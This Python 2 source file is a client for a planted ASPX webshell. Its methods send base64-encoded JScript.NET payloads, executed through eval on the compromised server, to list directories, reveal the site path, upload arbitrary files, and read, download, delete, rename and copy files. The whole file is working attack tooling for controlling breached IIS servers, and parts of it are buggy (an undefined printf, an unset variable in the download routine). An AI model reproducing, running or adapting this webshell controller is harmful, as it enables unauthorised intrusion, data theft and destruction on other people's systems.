#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import re
from tools import *

class aspxshell:
    sitepath = ""
    shellpass = ""
    url = ""

    def __init__(self, url, shellpass):
        code = '''
        Response.Write(Request.PhysicalApplicationPath);
        '''.strip()
        self.shellpass = shellpass
        self.url = url
        #data = {shellpass : code}
        code = shellpass + '=' +code
        html = Spider.oldpost(url, code)  
        self.sitepath =  html[:html.rfind("\\")+1].replace('\\', '\\\\')
        print self.sitepath
        
    #浏览文件目录
    def GetFilePath(self, path=None):
        filelist = re.compile(r'file:([\s\S]+?) time:([\s\S]+?) size:([\s\S]+?)\n')
        # dirlist = re.compile(r"dir:([\s\S]+?)\ttime:([\s\S]+?)\t\n")
        code = '''
        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIEQ9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oRCk7dmFyIHM9bS5HZXREaXJlY3RvcmllcygpO3ZhciBQOlN0cmluZzt2YXIgaTtmdW5jdGlvbiBUKHA6U3RyaW5nKTpTdHJpbmd7cmV0dXJuIFN5c3RlbS5JTy5GaWxlLkdldExhc3RXcml0ZVRpbWUocCkuVG9TdHJpbmcoInl5eXktTU0tZGQgSEg6bW06c3MiKTt9Zm9yKGkgaW4gcyl7UD1EK3NbaV0uTmFtZTtSZXNwb25zZS5Xcml0ZSgiZmlsZToiK3NbaV0uTmFtZSsiLyAiKyJ0aW1lOiIrVChQKSsiIHNpemU6MFxuIik7fXM9bS5HZXRGaWxlcygpO2ZvcihpIGluIHMpe1A9RCtzW2ldLk5hbWU7UmVzcG9uc2UuV3JpdGUoImZpbGU6IitzW2ldLk5hbWUrIiAiKyJ0aW1lOiIrVChQKSsiICIrInNpemU6IitzW2ldLkxlbmd0aCsiXG4iKTt9")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.End();
        '''.strip()
        if path == None:
            path = self.sitepath
        code += "&{0}".format(urllib.urlencode({'z1':base64.b64encode(path.replace('\\', '\\\\'))}))
        code = self.shellpass +'=' +code
        self.filesave(code, 'tmp.txt')
        data =  Spider.oldpost(self.url,code)
        list = []
        # if filelist.search(data) != None:
            # list.append(filelist.findall(data))
        # if dirlist.search(data) != None:
            # list.append(dirlist.findall(data))
        list = filelist.findall(data)
        self.ShowRule(list)
        del code

    def UploadFile(self,localfile, remotepath=None):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSk7dmFyIFo6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejIiXTt2YXIgQjpieXRlW109bmV3IGJ5dGVbWi5MZW5ndGgvMl07Zm9yKHZhciBpPTA7aTxaLkxlbmd0aDtpKz0yKXtCW2kvMl09Ynl0ZShDb252ZXJ0LlRvSW50MzIoWi5TdWJzdHJpbmcoaSwyKSwxNikpO312YXIgZnM6U3lzdGVtLklPLkZpbGVTdHJlYW09bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSk7ZnMuV3JpdGUoQiwwLEIuTGVuZ3RoKTtmcy5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        if remotepath == None:
            remotepath = self.sitepath
        else:
            remotepath = remotepath.replace('\\', '\\\\')
        print remotepath
        with open(localfile, 'rb') as file:
            data = file.read()
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        suffix =  os.path.splitext(localfile)
        code += "&z1={0}&z2={1}".format(base64.b64encode(remotepath), filestream)
        # data = {self.shellpass:code, 'z1':base64.b64encode(remotepath), 'z2':filestream}
        code = self.shellpass + '=' + code
        self.filesave(code, 'tmp.txt')
        data = Spider.oldpost(self.url,code)
        print data
        del code, suffix
        if  "->|1|<-" in data:
            print "upload ok"

    def DeleteFile(self, path):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejEiXTtpZihTeXN0ZW0uSU8uRGlyZWN0b3J5LkV4aXN0cyhQKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5EZWxldGUoUCx0cnVlKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5EZWxldGUoUCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        if path.find('\\') < 0:
            path = self.sitepath  + path
        else:
            path = path.replace('\\', '\\\\')
        code += "&{0}".format(urllib.urlencode({'z1':path}))
        code = self.shellpass +'=' +code
        data = Spider.oldpost(self.url, code)
        del code
        if "->|1|<-" in data:
            print "Delete File ok"

    #todo 需要解决访问网页500的错误
    def RenameFile(self, oldname, newname):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIHNyYz1SZXF1ZXN0Lkl0ZW1bInoxIl0sZHN0PVJlcXVlc3QuSXRlbVsiejIiXTtpZiAoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoc3JjKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5Nb3ZlKHNyYyxkc3QpO31lbHNle1N5c3RlbS5JTy5GaWxlLk1vdmUoc3JjLGRzdCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        if oldname.find('\\') < 0:
            oldname = self.sitepath + oldname
        if newname.find('\\') < 0:
            newname = self.sitepath + newname
        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldname}), urllib.urlencode({'z2':newname}))
        # code =  code.replace('+', '%20')
        code = self.shellpass + '=' + code
        data = Spider.oldpost(self.url,code)
        if "->|1|<-" in data:
            printf("rename file ok")

    #todo 同上
    def ReadFile(self, path):
        code ='''
        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihQLEVuY29kaW5nLkRlZmF1bHQpO1Jlc3BvbnNlLldyaXRlKG0uUmVhZFRvRW5kKCkpO20uQ2xvc2UoKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);};
        '''.strip()
        if path.find('\\') < 0:
            path = self.sitepath + path
        else:
            path = path.replace('\\', '\\\\')
        code += "&z1={0}".format(base64.b64encode(path))
        # data = Spider.post(self.url ,code)
        code = self.shellpass + '=' +code
        printf(Spider.oldpost(self.url ,code))
        del code

    #todo 同上
    def DownloadFile(self, path):
        code = '''
        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5JdGVtWyJ6MSJdKTs=")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.End();
        '''.strip()
        if path.find('\\') < 0:
            tmp = path
            path = self.sitepath + path
            
        else:
            path = path.replace('\\', '\\\\')
        data = {self.shellpass:code, 'z1':path}
        # code += "&{0}".format(urllib.urlencode({'z1':path}))
        # code = self.shellpass + '=' +code
        data =  Spider.post(self.url ,data)
        self.filesave(data, tmp)
        del code

    def CopyFile(self, oldfile, newfile):
        code ='''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiXTtmdW5jdGlvbiBjcChTOlN0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YXIgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3RvcmllcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2ZvciAoaSBpbiBmKVN5c3RlbS5JTy5GaWxlLkNvcHkoUysiXFwiK2ZbaV0uTmFtZSxEKyJcXCIrZltpXS5OYW1lKTtmb3IgKGkgaW4gZCljcChTKyJcXCIrZFtpXS5OYW1lLEQrIlxcIitkW2ldLk5hbWUpO31lbHNle1N5c3RlbS5JTy5GaWxlLkNvcHkoUyxEKTt9fWNwKFMsRCk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        if oldfile.find('\\') < 0:
            oldfile = self.sitepath + oldfile
        else:
            oldfile = oldfile.replace('\\', '\\\\')
        if newfile.find('\\') < 0:
            newfile = self.sitepath + newfile
        else:
            newfile = newfile.replace('\\', '\\\\')
        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldfile}), urllib.urlencode({'z2':newfile}))
        code = self.shellpass + '=' +code
        data = Spider.oldpost(self.url ,code)
        if "->|1|<-" in data:
            printf("copy file ok")
        del code


    def showrwx(self, num):
        permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
        if num in permx.keys():
            return permx[num]
        elif num == 3 :
            return "-wx"
        elif num == 5:
            return "r-x"
        elif num == 6:
            return "rw-"
        else:
            return "rwx"
        return string

    def ShowRule(self, list):
        string = "total:%s\nsize\t\tdate\t\t\tfile\n" % len(list)
        for line in list:
            string += "{0}".format(line[2])
            string += "\t{0}".format(line[1])
            string += "\t\t{0}\n".format(line[0])
        print string
        

    def filesave(self, data, name):
        with open(name, 'w') as file:
            file.write(data)

